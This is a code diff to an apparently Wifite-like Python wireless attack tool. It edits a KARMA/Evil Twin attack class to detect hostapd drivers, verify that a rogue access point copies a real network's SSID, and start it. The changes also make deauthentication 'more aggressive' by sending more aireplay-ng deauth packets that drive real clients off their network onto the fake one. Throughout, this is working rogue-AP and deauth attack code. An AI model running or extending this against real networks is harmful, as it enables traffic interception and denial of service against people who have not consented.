-                            if client.bssid == client_mac:
+                            if client.station == client_mac:
                                 return network.bssid
             
             # Last resort: scan for APs with this client
@@ -3160,7 +3143,7 @@ class AttackKARMA(Attack):
                         if network.clients:
                             Color.pl('{+} {C}Clients on selected target:{W}')
                             for client in network.clients:
-                                Color.pl('  {G}* {W}Client: {C}%s{W}' % client.bssid)
+                                Color.pl('  {G}* {W}Client: {C}%s{W}' % client.station)
                         else:
                             Color.pl('{!} {O}Warning: Selected target has no detected clients{W}')
                             Color.pl('{!} {O}This may reduce attack effectiveness{W}')
@@ -3218,6 +3201,132 @@ class AttackKARMA(Attack):
                 Color.pl('{!} {R}Error finding best network: {O}%s{W}' % str(e))
             return None
     
+    def detect_best_hostapd_driver(self):
+        """Detect the best hostapd driver for the current interface"""
+        try:
+            interface = getattr(self, 'rogue_interface', None)
+            if not interface:
+                return 'nl80211'  # Default fallback
+            
+            Color.pl('{+} {C}Detecting best hostapd driver for {G}%s{W}...{W}' % interface)
+            
+            # Method 1: Check if interface supports nl80211 (modern driver)
+            try:
+                result = subprocess.run(['iw', interface, 'info'], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    if 'nl80211' in result.stdout:
+                        Color.pl('{+} {G}Detected nl80211 driver support for {G}%s{W}' % interface)
+                        return 'nl80211'
+                    elif 'type managed' in result.stdout:
+                        Color.pl('{+} {C}Interface {G}%s{W} is in managed mode - will use nl80211{W}' % interface)
+                        return 'nl80211'
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}iw info failed: {O}%s{W}' % str(e))
+            
+            # Method 2: Check if interface supports AP mode with nl80211
+            try:
+                result = subprocess.run(['iw', interface, 'set', 'type', '__ap'], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    Color.pl('{+} {G}Interface {G}%s{W} supports AP mode with nl80211{W}' % interface)
+                    # Reset back to managed
+                    subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True, timeout=3)
+                    return 'nl80211'
+                else:
+                    Color.pl('{!} {O}Interface {G}%s{W} does not support AP mode with nl80211{W}' % interface)
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}AP mode test failed: {O}%s{W}' % str(e))
+            
+            # Method 3: Check if interface supports hostap driver (legacy)
+            try:
+                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    # Check if it's a legacy interface that might support hostap
+                    if 'IEEE 802.11' in result.stdout:
+                        Color.pl('{+} {C}Detected legacy interface - trying hostap driver{W}')
+                        return 'hostap'
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}iwconfig check failed: {O}%s{W}' % str(e))
+            
+            # Method 4: Check interface capabilities
+            try:
+                result = subprocess.run(['iw', interface, 'list'], capture_output=True, text=True, timeout=5)
+                if result.returncode == 0:
+                    if 'AP' in result.stdout or 'ap' in result.stdout:
+                        Color.pl('{+} {G}Interface {G}%s{W} supports AP mode{W}' % interface)
+                        return 'nl80211'
+                    else:
+                        Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
+                        return None  # Interface doesn't support AP mode
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}iw list failed: {O}%s{W}' % str(e))
+            
+            # Fallback to nl80211
+            Color.pl('{!} {O}Using nl80211 driver as fallback for {G}%s{W}' % interface)
+            return 'nl80211'
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error detecting hostapd driver: {O}%s{W}' % str(e))
+            return 'nl80211'  # Default fallback
+    
+    def check_interface_ap_support(self, interface):
+        """Check if interface supports AP mode"""
+        try:
+            Color.pl('{+} {C}Checking AP mode support for {G}%s{W}...{W}' % interface)
+            
+            # Method 1: Check with iw list
+            try:
+                result = subprocess.run(['iw', interface, 'list'], capture_output=True, text=True, timeout=5)
+                if result.returncode == 0:
+                    if 'AP' in result.stdout or 'ap' in result.stdout:
+                        Color.pl('{+} {G}Interface {G}%s{W} supports AP mode{W}' % interface)
+                        return True
+                    else:
+                        Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
+                        return False
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}iw list failed: {O}%s{W}' % str(e))
+            
+            # Method 2: Try to set AP mode
+            try:
+                result = subprocess.run(['iw', interface, 'set', 'type', '__ap'], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    Color.pl('{+} {G}Interface {G}%s{W} supports AP mode{W}' % interface)
+                    # Reset back to managed
+                    subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True, timeout=3)
+                    return True
+                else:
+                    Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
+                    return False
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}AP mode test failed: {O}%s{W}' % str(e))
+            
+            # Method 3: Check with iwconfig
+            try:
+                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    if 'IEEE 802.11' in result.stdout:
+                        Color.pl('{+} {C}Interface {G}%s{W} is a wireless interface - may support AP mode{W}' % interface)
+                        return True
+            except Exception as e:
+                if Configuration.verbose > 1:
+                    Color.pl('{!} {O}iwconfig check failed: {O}%s{W}' % str(e))
+            
+            Color.pl('{!} {R}Interface {G}%s{W} does not support AP mode{W}' % interface)
+            return False
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error checking AP support: {O}%s{W}' % str(e))
+            return False
+    
+    
     def create_single_hostapd_config(self, ssid, channel, spoof_bssid=None):
         """Create a single hostapd configuration file"""
         try:
@@ -3230,15 +3339,10 @@ driver=nl80211
 ssid={ssid}
 hw_mode=g
 channel={channel}
-wmm_enabled=1
+wmm_enabled=0
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-country_code=US
-ieee80211n=1
-ieee80211ac=1
-ht_capab=[HT40+][HT40-][SHORT-GI-20][SHORT-GI-40]
-vht_capab=[VHT40][VHT80][VHT160][SHORT-GI-80][SHORT-GI-160]
 """
             
             # Add BSSID spoofing if specified
@@ -3412,147 +3516,89 @@ server=8.8.8.8
         except Exception:
             return False
 
+    def verify_rogue_ap_config(self):
+        """Verify that the rogue AP config matches the real network"""
+        try:
+            if not self.hostapd_config:
+                Color.pl('{!} {R}No hostapd config to verify{W}')
+                return False
+            
+            Color.pl('{+} {C}Verifying rogue AP configuration...{W}')
+            
+            # Read the hostapd config file
+            with open(self.hostapd_config, 'r') as f:
+                config_content = f.read()
+            
+            # Extract SSID from config
+            ssid_match = re.search(r'ssid=(.+)', config_content)
+            if not ssid_match:
+                Color.pl('{!} {R}No SSID found in hostapd config{W}')
+                return False
+            
+            config_ssid = ssid_match.group(1).strip()
+            Color.pl('{+} {C}Rogue AP SSID: {G}%s{W}' % config_ssid)
+            
+            # Check if this SSID matches any real network
+            if hasattr(self, 'real_networks') and self.real_networks:
+                for network in self.real_networks:
+                    if network.essid == config_ssid:
+                        Color.pl('{+} {G}✓ Rogue AP matches real network: {G}%s{W}' % config_ssid)
+                        Color.pl('{+} {G}✓ Real network BSSID: {G}%s{W}' % network.bssid)
+                        Color.pl('{+} {G}✓ Real network Channel: {G}%s{W}' % network.channel)
+                        return True
+                
+                Color.pl('{!} {O}⚠ Rogue AP SSID does not match any real network{W}')
+                Color.pl('{!} {O}This may still work for devices with this SSID in their PNL{W}')
+                return True  # Still allow it to proceed
+            else:
+                Color.pl('{+} {C}No real networks to compare against{W}')
+                Color.pl('{+} {C}Rogue AP will use SSID: {G}%s{W}' % config_ssid)
+                return True
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error verifying rogue AP config: {O}%s{W}' % str(e))
+            return True  # Allow to proceed even if verification fails
+
     def start_rogue_ap(self):
-        """Start multiple Evil Twin access points"""
+        """Start Evil Twin access point"""
         try:
             # Check if hostapd config exists
             if not self.hostapd_config:
                 Color.pl('{!} {R}No hostapd configuration found - cannot start Evil Twin{W}')
                 return False
             
-            # Check if hostapd is available with better error handling
-            hostapd_available = self.check_hostapd_availability()
-            if not hostapd_available:
+            # Verify rogue AP config matches real network
+            if not self.verify_rogue_ap_config():
+                Color.pl('{!} {R}Rogue AP config verification failed{W}')
                 return False
             
-            # Check if dnsmasq is available
-            dnsmasq_available = self.check_dnsmasq_availability()
-            if not dnsmasq_available:
-                return False
+            # Start hostapd
+            hostapd_cmd = ['hostapd', '-B', self.hostapd_config]
+            Color.pl('{+} {C}Starting hostapd with config: {G}%s{W}' % self.hostapd_config)
             
-            # Start primary Evil Twin
-            if self.hostapd_config:
-                # Interface should already be in master mode from setup_rogue_ap
-                # Additional interface preparation for hostapd
-                if not self.final_interface_preparation():
-                    Color.pl('{!} {R}Final interface preparation failed{W}')
-                    return False
-                
-                hostapd_cmd = ['hostapd', '-B', self.hostapd_config]  # -B for background
-                Color.pl('{+} {C}Starting hostapd with config: {G}%s{W}' % self.hostapd_config)
-                
-                # Capture stderr for debugging
-                self.rogue_ap_process = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                
-                # Give it time to start
-                time.sleep(5)  # Increased timeout
-                
-                # Check if hostapd started successfully
-                # hostapd with -B flag runs in background, so we check if it's still running
-                if self.rogue_ap_process.poll() is None:
-                    # Process is still running in background - success!
-                    Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
-                    Color.pl('{+} {G}AP is enabled and ready for connections{W}')
-                    
-                    # Verify AP is actually working by checking interface status
-                    try:
-                        if self.rogue_interface:
-                            result = subprocess.run(['iwconfig', self.rogue_interface], capture_output=True, text=True, timeout=3)
-                            if result.returncode == 0 and 'Mode:Master' in result.stdout:
-                                Color.pl('{+} {G}Interface confirmed in Master mode - AP is active{W}')
-                            else:
-                                Color.pl('{!} {O}Warning: Interface may not be in Master mode{W}')
-                        else:
-                            Color.pl('{!} {O}Warning: No rogue interface available for verification{W}')
-                    except Exception as e:
-                        if Configuration.verbose > 1:
-                            Color.pl('{!} {O}Could not verify interface mode: {O}%s{W}' % str(e))
-                else:
-                    # Process exited, get error output
-                    stdout, stderr = self.rogue_ap_process.communicate()
-                    error_msg = 'Failed to start primary Evil Twin'
-                    Color.pl('{!} {R}%s{W}' % error_msg)
-                    if stderr:
-                        Color.pl('{!} {O}hostapd error: {R}%s{W}' % stderr.strip())
-                        error_msg += ': ' + stderr.strip()
-                    if stdout:
-                        Color.pl('{!} {O}hostapd output: {R}%s{W}' % stdout.strip())
-                        
-                        # Provide comprehensive troubleshooting
-                        self.provide_hostapd_troubleshooting()
-                        
-                        # Also log to GUI
-                        if hasattr(self, 'target') and self.target:
-                            Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                        return False
-                    else:
-                        # Process exited normally, verify AP is actually running
-                        if self.verify_ap_running():
-                            Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
-                            Color.pl('{+} {G}AP is enabled and ready for connections{W}')
-                        else:
-                            Color.pl('{!} {R}AP may not be running properly{W}')
-                            Color.pl('{!} {O}Continuing anyway - AP may still work{W}')
+            self.rogue_ap_process = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             
-            # Start additional Evil Twins if we have multiple configs
-            if hasattr(self, 'hostapd_configs') and len(self.hostapd_configs) > 1:
-                self.start_additional_evil_twins()
+            # Give it time to start
+            time.sleep(3)
             
+            # Get output to check if hostapd started successfully
+            stdout, stderr = self.rogue_ap_process.communicate()
             
-            # Start dnsmasq for DHCP (only if DNS spoofing is enabled)
-            if self.dns_spoofing_enabled and hasattr(self, 'dnsmasq_config') and self.dnsmasq_config:
-                # Strict preflight: free port 53 and ensure AP iface is up
-                if not self.free_port_53():
-                    Color.pl('{!} {R}Port 53 is busy; could not free DNS port automatically{W}')
-                    Color.pl('{!} {O}Stop system resolvers and dns services, then retry:{W}')
-                    Color.pl('{!}   sudo systemctl stop systemd-resolved && sudo pkill -f dnsmasq{W}')
-                    return False
-
-                dnsmasq_cmd = ['dnsmasq', '-C', self.dnsmasq_config]
-                Color.pl('{+} {C}Starting dnsmasq with config: {G}%s{W}' % self.dnsmasq_config)
-                
-                # Capture stderr for debugging
-                self.dhcp_process = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-                
-                # Give processes time to start
-                time.sleep(3)
-                
-                # Check if dnsmasq started successfully
-                if self.dhcp_process.poll() is None:
-                    Color.pl('{+} {G}Evil Twin infrastructure started successfully{W}')
-                    return True
-                else:
-                    # Get error output
-                    stdout, stderr = self.dhcp_process.communicate()
-                    error_msg = 'Failed to start dnsmasq'
-                    Color.pl('{!} {R}%s{W}' % error_msg)
-                    if stderr:
-                        Color.pl('{!} {O}dnsmasq error: {R}%s{W}' % stderr.strip())
-                        error_msg += ': ' + stderr.strip()
-                    if stdout:
-                        Color.pl('{!} {O}dnsmasq output: {R}%s{W}' % stdout.strip())
-
-                    # Provide actionable hints for common causes
-                    Color.pl('{!} {O}If error mentions port 53 in use, stop systemd-resolved:{W}')
-                    Color.pl('{!} {O}  sudo systemctl stop systemd-resolved{W}')
-                    Color.pl('{!} {O}Also ensure no other dnsmasq instance is running:{W}')
-                    Color.pl('{!} {O}  sudo pkill -f dnsmasq{W}')
-                    
-                    # Also log to GUI
-                    if hasattr(self, 'target') and self.target:
-                        Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                    return False
-            else:
-                Color.pl('{+} {G}Evil Twin infrastructure started successfully (DNS spoofing disabled){W}')
+            # Check if hostapd started successfully by looking for "AP-ENABLED" message
+            if stdout and 'AP-ENABLED' in stdout:
+                Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
+                Color.pl('{+} {G}AP is enabled and ready for connections{W}')
                 return True
+            else:
+                Color.pl('{!} {R}Failed to start primary Evil Twin{W}')
+                if stdout:
+                    Color.pl('{!} {O}hostapd output: {R}%s{W}' % stdout.strip())
+                if stderr:
+                    Color.pl('{!} {O}hostapd error: {R}%s{W}' % stderr.strip())
+                return False
             
         except Exception as e:
-            error_msg = 'Failed to start Evil Twin infrastructure: ' + str(e)
-            Color.pl('{!} {R}%s{W}' % error_msg)
-            
-            # Also log to GUI
-            if hasattr(self, 'target') and self.target:
-                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
+            Color.pl('{!} {R}Failed to start Evil Twin: {O}%s{W}' % str(e))
             return False
     
     def start_additional_evil_twins(self):
@@ -3828,7 +3874,7 @@ server=8.8.8.8
                 Color.pl('{!} {R}Error starting victim management: {O}%s{W}' % str(e))
     
     def kick_clients_from_network(self, target):
-        """Kick clients from a real network to force them to connect to fake AP"""
+        """Kick clients from a real network to force them to connect to fake AP - AGGRESSIVE APPROACH"""
         try:
             if not target.clients:
                 return
@@ -3836,39 +3882,28 @@ server=8.8.8.8
             Color.pl('{+} {C}Kicking clients from {G}%s{W} ({C}%s{W}) to force fake AP connection{W}' % 
                     (target.essid, target.bssid))
             
-            # Use aireplay to send deauth packets
+            # Use aireplay to send deauth packets - IMMEDIATE AND AGGRESSIVE
             for client in target.clients:
                 try:
-                    # Send deauth packets to client
+                    # Send deauth packets to client - MORE PACKETS FOR BETTER EFFECT
                     deauth_cmd = [
                         'aireplay-ng',
-                        '-0', '2',  # Reduced to 2 deauth packets
+                        '-0', '5',  # Increased to 5 packets for better effect
                         '--ignore-negative-one',
                         '-a', target.bssid,  # Target AP
-                        '-c', client.bssid,  # Target client
+                        '-c', client.station,  # Target client MAC address ✅ FIXED
                         self.probe_interface
                     ]
                     
-                    # Run deauth with proper process management
-                    try:
-                        process = subprocess.Popen(deauth_cmd, 
-                                                 stdout=subprocess.DEVNULL, 
-                                                 stderr=subprocess.DEVNULL,
-                                                 preexec_fn=os.setsid)
-                        process.wait(timeout=2)
-                    except subprocess.TimeoutExpired:
-                        try:
-                            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
-                        except:
-                            pass
-                        process.kill()
+                    # Execute immediately without delays - OLD CODE APPROACH
+                    subprocess.run(deauth_cmd, capture_output=True, timeout=3)
                     
                     if Configuration.verbose > 1:
-                        Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % (client.bssid, target.essid))
+                        Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % (client.station, target.essid))
                         
                 except Exception as e:
                     if Configuration.verbose > 1:
-                        Color.pl('{!} {R}Failed to deauth {G}%s{W}: {O}%s{W}' % (client.bssid, str(e)))
+                        Color.pl('{!} {R}Failed to deauth {G}%s{W}: {O}%s{W}' % (client.station, str(e)))
                         
         except Exception as e:
             if Configuration.verbose > 1:
@@ -3997,97 +4032,6 @@ server=8.8.8.8
         if hasattr(self, 'target') and self.target:
             Color.pattack('KARMA', self.target, phase_name, action)
     
-    def check_hostapd_availability(self):
-        """Check if hostapd is available and working"""
-        try:
-            # First check if hostapd binary exists
-            result = subprocess.run(['which', 'hostapd'], capture_output=True, text=True)
-            if result.returncode != 0:
-                error_msg = 'hostapd not found - please install it'
-                Color.pl('{!} {R}%s{W}' % error_msg)
-                Color.pl('{!} {O}Install with: sudo apt install hostapd{W}')
-                Color.pl('{!} {O}Or try: sudo apt update && sudo apt install hostapd{W}')
-                
-                # Also log to GUI
-                if hasattr(self, 'target') and self.target:
-                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                return False
-            
-            # Check and resolve common conflicts before testing
-            if not self.resolve_hostapd_conflicts():
-                return False
-            
-            # Test if hostapd can actually start with a configuration
-            # Create a minimal test config using dynamic temp directory
-            import tempfile
-            import os
-            test_config = os.path.join(tempfile.gettempdir(), 'test_hostapd_karma.conf')
-            try:
-                with open(test_config, 'w') as f:
-                    # Use dynamic interface detection for test config
-                    from ..gui.utils import SystemUtils
-                    interfaces = SystemUtils.get_wireless_interfaces()
-                    test_interface = interfaces[0] if interfaces else None
-                    
-                    if not test_interface:
-                        error_msg = 'No interface available for hostapd test'
-                        Color.pl('{!} {R}%s{W}' % error_msg)
-                        
-                        # Also log to GUI
-                        if hasattr(self, 'target') and self.target:
-                            Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                        return False
-                    
-                    f.write(f'interface={test_interface}\ndriver=nl80211\nssid=test\nhw_mode=g\nchannel=1\n')
-                
-                # Test hostapd with the config (non-blocking)
-                result = subprocess.run(['hostapd', '-B', test_config], 
-                                      capture_output=True, text=True, timeout=3)
-                
-                # Clean up test config
-                import os
-                if os.path.exists(test_config):
-                    os.remove(test_config)
-                
-                # Check if hostapd started successfully
-                if result.returncode != 0:
-                    error_msg = 'hostapd cannot start - interface or permission issue'
-                    Color.pl('{!} {R}%s{W}' % error_msg)
-                    if result.stderr:
-                        Color.pl('{!} {O}hostapd error: {R}%s{W}' % result.stderr.strip()[:100])
-                    
-                    # Provide specific troubleshooting steps
-                    self.provide_hostapd_troubleshooting()
-                    
-                    # Also log to GUI
-                    if hasattr(self, 'target') and self.target:
-                        Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                    return False
-                    
-            except Exception as e:
-                error_msg = f'hostapd test failed: {str(e)}'
-                Color.pl('{!} {R}%s{W}' % error_msg)
-                
-                # Also log to GUI
-                if hasattr(self, 'target') and self.target:
-                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                return False
-            
-            # Additional check: interface permissions
-            if not self.check_interface_permissions():
-                return False
-            
-            Color.pl('{+} {G}hostapd is available and working{W}')
-            return True
-            
-        except Exception as e:
-            error_msg = f'Error checking hostapd: {str(e)}'
-            Color.pl('{!} {R}%s{W}' % error_msg)
-            
-            # Also log to GUI
-            if hasattr(self, 'target') and self.target:
-                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-            return False
     
     def check_interface_permissions(self):
         """Check if the interface has proper permissions for hostapd"""
@@ -4150,29 +4094,6 @@ server=8.8.8.8
             return False
     
     
-    def resolve_hostapd_conflicts(self):
-        """Resolve common conflicts that prevent hostapd from starting"""
-        try:
-            Color.pl('{+} {C}Checking for hostapd conflicts...{W}')
-            
-            # Check and stop NetworkManager if it's interfering
-            if not self.stop_network_manager():
-                return False
-            
-            # Check and fix interface mode conflicts
-            if not self.switch_interface_mode('master', 'Conflict Resolution'):
-                return False
-            
-            # Check and fix permission issues
-            if not self.fix_permission_issues():
-                return False
-            
-            Color.pl('{+} {G}Hostapd conflicts resolved{W}')
-            return True
-            
-        except Exception as e:
-            Color.pl('{!} {R}Error resolving hostapd conflicts: {O}%s{W}' % str(e))
-            return False
     
     def stop_network_manager(self):
         """Stop NetworkManager if it's interfering with hostapd"""
@@ -4219,8 +4140,8 @@ server=8.8.8.8
                 except:
                     continue
             
-            # If not found, try to get from airmon-ng
-            result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
+            # If not found, try to get from iw dev (no airmon-ng needed)
+            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
             if result.returncode == 0:
                 for line in result.stdout.split('\n'):
                     if base_interface in line and 'mon' in line:
@@ -4253,8 +4174,27 @@ server=8.8.8.8
             # Clean up interface name - convert monitor interfaces to base interfaces
             interface = self.cleanup_interface_name(interface)
             
-            # Ensure interface is up
+            # Kill any existing hostapd processes on this interface
+            Color.pl('{+} {C}Cleaning up existing hostapd processes...{W}')
+            subprocess.run(['pkill', '-f', f'hostapd.*{interface}'], capture_output=True, timeout=5)
+            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True, timeout=5)
+            time.sleep(3)
+            
+            # Reset interface state completely
+            Color.pl('{+} {C}Resetting interface state...{W}')
+            subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
+            time.sleep(2)
+            
+            # Try to reset the interface using iw
+            try:
+                subprocess.run(['iw', interface, 'set', 'type', 'managed'], capture_output=True, timeout=5)
+                time.sleep(1)
+            except:
+                pass
+            
+            # Bring interface back up
             subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
+            time.sleep(2)
             
             # Check current interface mode
             result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
@@ -4310,68 +4250,7 @@ server=8.8.8.8
             Color.pl('{!} {R}Error fixing permissions: {O}%s{W}' % str(e))
             return False
     
-    def provide_hostapd_troubleshooting(self):
-        """Provide comprehensive troubleshooting steps for hostapd issues"""
-        # Prefer configured rogue_interface; fallback to detected interface (no hardcoded names)
-        interface = getattr(self, 'rogue_interface', None)
-        if not interface:
-            try:
-                from ..gui.utils import SystemUtils
-                detected = SystemUtils.get_wireless_interfaces()
-                interface = detected[0] if detected else 'unknown'
-            except Exception:
-                interface = 'unknown'
-        
-        Color.pl('{!} {O}=== Hostapd Troubleshooting Steps ==={W}')
-        Color.pl('{!} {O}1. Stop NetworkManager: sudo systemctl stop NetworkManager{W}')
-        Color.pl('{!} {O}2. Check interface mode: iwconfig %s{W}' % interface)
-        Color.pl('{!} {O}3. Switch to managed mode: sudo iwconfig %s mode managed{W}' % interface)
-        Color.pl('{!} {O}4. Fix permissions: sudo chmod 666 /dev/net/tun{W}')
-        Color.pl('{!} {O}7. Restart interface: sudo ifconfig %s down && sudo ifconfig %s up{W}' % (interface, interface))
-        Color.pl('{!} {O}8. Check hostapd version: hostapd -v{W}')
-        Color.pl('{!} {O}9. Reinstall hostapd: sudo apt remove hostapd && sudo apt install hostapd{W}')
-        Color.pl('{!} {O}11. Try different interface: Use a separate WiFi adapter for AP mode{W}')
-        Color.pl('{!} {O}=== End Troubleshooting ==={W}')
     
-    def check_dnsmasq_availability(self):
-        """Check if dnsmasq is available and working"""
-        try:
-            # First check if dnsmasq binary exists
-            result = subprocess.run(['which', 'dnsmasq'], capture_output=True, text=True)
-            if result.returncode != 0:
-                error_msg = 'dnsmasq not found - please install it'
-                Color.pl('{!} {R}%s{W}' % error_msg)
-                Color.pl('{!} {O}Install with: sudo apt install dnsmasq{W}')
-                Color.pl('{!} {O}Or try: sudo apt update && sudo apt install dnsmasq{W}')
-                
-                # Also log to GUI
-                if hasattr(self, 'target') and self.target:
-                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                return False
-            
-            # Test if dnsmasq can run (check version)
-            result = subprocess.run(['dnsmasq', '--version'], capture_output=True, text=True, timeout=5)
-            if result.returncode != 0:
-                error_msg = 'dnsmasq not working properly - may need reinstallation'
-                Color.pl('{!} {R}%s{W}' % error_msg)
-                Color.pl('{!} {O}Try: sudo apt remove dnsmasq && sudo apt install dnsmasq{W}')
-                
-                # Also log to GUI
-                if hasattr(self, 'target') and self.target:
-                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-                return False
-            
-            Color.pl('{+} {G}dnsmasq is available and working{W}')
-            return True
-            
-        except Exception as e:
-            error_msg = f'Error checking dnsmasq: {str(e)}'
-            Color.pl('{!} {R}%s{W}' % error_msg)
-            
-            # Also log to GUI
-            if hasattr(self, 'target') and self.target:
-                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
-            return False
     
     def verify_ap_running(self):
         """Verify that the AP is actually running"""
@@ -4538,7 +4417,8 @@ server=8.8.8.8
         try:
             subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
             subprocess.run(['pkill', '-f', 'aireplay'], capture_output=True)
-            subprocess.run(['pkill', '-f', 'airmon'], capture_output=True)
+            # Clean up any remaining wireless processes
+            subprocess.run(['pkill', '-f', 'iwconfig'], capture_output=True)
             Color.pl('{+} {G}Killed remaining attack processes{W}')
         except Exception as e:
             Color.pl('{!} {O}Warning: Failed to kill attack processes: {R}%s{W}' % str(e))
@@ -4613,9 +4493,12 @@ server=8.8.8.8
                 try:
                     Color.pl('{+} {C}Restoring interface {G}%s{W} for optimal scanning...{W}' % iface)
                     
-                    # Stop airmon-ng if running
+                    # Switch interface to managed mode if it's in monitor mode
                     try:
-                        subprocess.run(['airmon-ng', 'stop', iface], capture_output=True, timeout=5)
+                        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True, timeout=3)
+                        if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
+                            Color.pl('{+} {C}Switching {G}%s{W} from monitor to managed mode{W}' % iface)
+                            subprocess.run(['iwconfig', iface, 'mode', 'managed'], capture_output=True, timeout=5)
                     except:
                         pass
                     
